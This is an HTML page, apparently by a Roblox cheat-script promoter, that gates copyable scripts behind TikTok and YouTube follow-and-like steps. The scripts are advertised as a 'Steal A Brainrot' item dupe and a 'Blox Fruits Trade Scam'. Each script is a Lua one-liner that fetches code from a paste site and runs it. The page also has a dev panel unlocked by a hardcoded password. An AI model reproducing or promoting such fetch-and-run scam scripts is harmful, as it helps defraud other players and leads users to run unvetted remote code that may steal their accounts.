<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Unlock Dupe</title>

<style>
  body {
    margin: 0;
    min-height: 100vh;
    background: linear-gradient(180deg,#0b1220,#050814);
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    color: #fff;
  }

  .card {
    width: 90%;
    max-width: 400px;
    background: #111a2e;
    border-radius: 16px;
    padding: 22px;
    box-shadow: 0 20px 40px rgba(0,0,0,.6);
  }

  .title {
    text-align: center;
    font-size: 24px;
    font-weight: bold;
    color: #4fd1ff;
    user-select: none;
  }

  .dev-key, .dev-apple {
    cursor: pointer;
    margin-right: 8px;
    user-select: none;
  }

  .dev-key {
    color: #facc15; /* yellow */
  }

  .dev-apple {
    color: #34d399; /* greenish */
  }

  .subtitle {
    text-align: center;
    font-size: 14px;
    opacity: .85;
    margin: 8px 0 18px;
  }

  .task {
    width: 100%;
    border: none;
    padding: 14px;
    margin: 7px 0;
    border-radius: 10px;
    font-size: 15px;
    font-weight: bold;
    cursor: pointer;
    color: #fff;
  }

  .tiktok { background:#3b82f6; }
  .youtube { background:#f59e0b; }
  .like { background:#22c55e; }
  .comment { background:#ec4899; }
  .watch { background:#ef4444; }
  .switch { background:#64748b; }

  .progress {
    background: #1e293b;
    border-radius: 10px;
    height: 12px;
    margin-top: 16px;
    overflow: hidden;
  }

  .bar {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg,#4fd1ff,#38bdf8);
    transition: width .3s;
  }

  .percent {
    text-align: center;
    font-size: 13px;
    margin-top: 6px;
  }

  .scripts {
    display: none;
    margin-top: 20px;
  }

  .script-box {
    background: #0b1220;
    border-radius: 12px;
    padding: 14px;
    margin-bottom: 12px;
  }

  textarea {
    width: 100%;
    height: 90px;
    background: #020617;
    color: #4fd1ff;
    border: none;
    border-radius: 8px;
    padding: 10px;
    resize: none;
    font-size: 12px;
  }

  .copy {
    width: 100%;
    border: none;
    padding: 10px;
    border-radius: 8px;
    background: #4fd1ff;
    color: #000;
    font-weight: bold;
    cursor: pointer;
    margin-top: 8px;
  }

  .dev-panel {
    display: none;
    position: fixed;
    bottom: 10px;
    left: 50%;
    transform: translateX(-50%);
    width: 90%;
    max-width: 420px;
    background: #020617;
    border-radius: 14px;
    padding: 14px;
    box-shadow: 0 0 30px rgba(0,0,0,.8);
    z-index: 999;
  }

  .dev-header {
    display: flex;
    justify-content: space-between;
    font-weight: bold;
    margin-bottom: 10px;
  }

  .close {
    cursor: pointer;
    color: #f87171;
  }

  .footer {
    text-align: center;
    font-size: 11px;
    color: #94a3b8;
    margin-top: 10px;
    user-select: none;
  }

</style>
</head>

<body>

<!-- PAGE 1 -->
<div class="card" id="page1">
  <div class="title">
    <span class="dev-key" onclick="openDev()">🔑</span>Steal A Brainrot Dupe
  </div>
  <div class="subtitle">Complete all steps to unlock</div>

  <button class="task tiktok" onclick="step(this,'https://www.tiktok.com/@void_scriptz')">📌 Follow TikTok</button>
  <button class="task youtube" onclick="step(this,'https://youtube.com/@xxxvoid_scriptzxxx')">🔔 Subscribe YouTube</button>
  <button class="task like" onclick="step(this,'https://youtube.com/shorts/ycfxxkTQmTU')">👍 Like</button>
  <button class="task comment" onclick="step(this,'https://youtube.com/shorts/ycfxxkTQmTU')">💬 Comment</button>
  <button class="task watch" onclick="step(this,'https://youtube.com/shorts/ycfxxkTQmTU')">▶️ Watch</button>

  <div class="progress"><div class="bar" id="bar"></div></div>
  <div class="percent" id="percent">0%</div>

  <div class="scripts" id="dupes">
    <div class="script-box">
      <textarea readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
      <button class="copy" onclick="copyScript(this)">Copy</button>
    </div>
    <div class="script-box">
      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
      <button class="copy" onclick="copyScript(this)">Copy</button>
    </div>
    <div class="script-box">
      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
      <button class="copy" onclick="copyScript(this)">Copy</button>
    </div>
  </div>

  <button class="task switch" onclick="switchPage()">🍎 Blox Fruits Trade Scam</button>
</div>

<!-- PAGE 2 -->
<div class="card" id="page2" style="display:none">
  <div class="title">
    <span class="dev-apple" onclick="openDev()">🍎</span> Blox Fruits Trade Scam
  </div>
  <div class="subtitle">Complete all steps to unlock</div>

  <button class="task tiktok" onclick="step2(this,'https://www.tiktok.com/@void_scriptz')">📌 Follow TikTok</button>
  <button class="task youtube" onclick="step2(this,'https://youtube.com/@xxxvoid_scriptzxxx')">🔔 Subscribe YouTube</button>
  <button class="task like" onclick="step2(this,'https://youtube.com/shorts/ycfxxkTQmTU')">👍 Like</button>
  <button class="task comment" onclick="step2(this,'https://youtube.com/shorts/ycfxxkTQmTU')">💬 Comment</button>
  <button class="task watch" onclick="step2(this,'https://youtube.com/shorts/ycfxxkTQmTU')">▶️ Watch</button>

  <div class="progress"><div class="bar" id="bar2"></div></div>
  <div class="percent" id="percent2">0%</div>

  <div class="scripts" id="bloxScripts">
    <div class="script-box">
      <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xU2oTZng4Oga2rmU/raw", true))()</textarea>
      <button class="copy" onclick="copyScript(this)">Copy</button>
    </div>
  </div>

  <button class="task switch" onclick="switchPage()">🔑 Steal A Brainrot Dupe</button>
</div>

<!-- DEV PANEL -->
<div class="dev-panel" id="dev">
  <div class="dev-header">
    <span>DEV PANEL</span>
    <span class="close" onclick="dev.style.display='none'">✖</span>
  </div>

  <textarea readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
  <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
  <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
  <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xU2oTZng4Oga2rmU/raw", true))()</textarea>
</div>

<div class="footer">Last updated: January 2026<br>
Credits: <a href="https://github.com/" target="_blank" style="color:#94a3b8;">GitHub</a> | <a href="https://www.tiktok.com/@void_scriptz" target="_blank" style="color:#94a3b8;">TikTok</a> | <a href="https://youtube.com/@xxxvoid_scriptzxxx" target="_blank" style="color:#94a3b8;">YouTube</a></div>

<script>
  const total = 5;

  // Page 1 progress state
  let done1 = 0;
  // Page 2 progress state
  let done2 = 0;

  function step(btn, link){
    if(btn.dataset.done) return;
    btn.dataset.done = true;
    btn.style.opacity = .6;
    done1++;
    updateProgress(1, done1);
    window.open(link, "_blank");
  }

  function step2(btn, link){
    if(btn.dataset.done) return;
    btn.dataset.done = true;
    btn.style.opacity = .6;
    done2++;
    updateProgress(2, done2);
    window.open(link, "_blank");
  }

  function updateProgress(page, done){
    let percent = Math.floor((done / total) * 100);
    if(page === 1){
      document.getElementById("bar").style.width = percent + "%";
      document.getElementById("percent").innerText = percent + "%";
      if(percent === 100){
        document.getElementById("dupes").style.display = "block";
      }
    } else {
      document.getElementById("bar2").style.width = percent + "%";
      document.getElementById("percent2").innerText = percent + "%";
      if(percent === 100){
        document.getElementById("bloxScripts").style.display = "block";
      }
    }
  }

  function copyScript(btn){
    if(confirm("Use The Script In Second Sea Cafe Or It Won’t Work\n\nPress OK to confirm")){
      navigator.clipboard.writeText(btn.previousElementSibling.value);
      alert("Copied!");
    }
  }

  function switchPage(){
    const page1 = document.getElementById("page1");
    const page2 = document.getElementById("page2");
    if(page1.style.display === "none"){
      page1.style.display = "block";
      page2.style.display = "none";
    } else {
      page1.style.display = "none";
      page2.style.display = "block";
    }
  }

  function openDev(){
    const dev = document.getElementById("dev");
    const pass = prompt("Enter Dev Code");
    if(pass === "NinjaBlender223"){
      done1 = total;
      done2 = total;
      updateProgress(1, done1);
      updateProgress(2, done2);
      dev.style.display = "block";
    }
  }
</script>

</body>
</html>
